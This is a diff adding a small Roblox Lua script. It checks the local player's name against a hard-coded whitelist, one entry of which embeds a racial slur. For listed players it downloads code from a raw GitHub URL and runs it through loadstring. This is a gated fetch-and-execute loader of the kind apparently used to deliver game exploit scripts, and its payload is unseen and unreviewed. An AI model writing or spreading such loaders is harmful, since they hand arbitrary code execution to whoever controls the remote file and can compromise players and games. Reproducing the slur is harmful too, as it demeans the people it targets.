@@ -1,0 +1,21 @@
+local whitelist = {
+    "gersvang",
+    "luthias",
+    "DellAugyst",
+    "NvbbIGGER"
+}
+
+local playerName = game.Players.LocalPlayer.Name
+
+local function isWhitelisted(name)
+    for _, whitelistedName in ipairs(whitelist) do
+        if name == whitelistedName then
+            return true
+        end
+    end
+    return false
+end
+
+if isWhitelisted(playerName) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AchimLGT/otojack/main/jack1"))()
+end
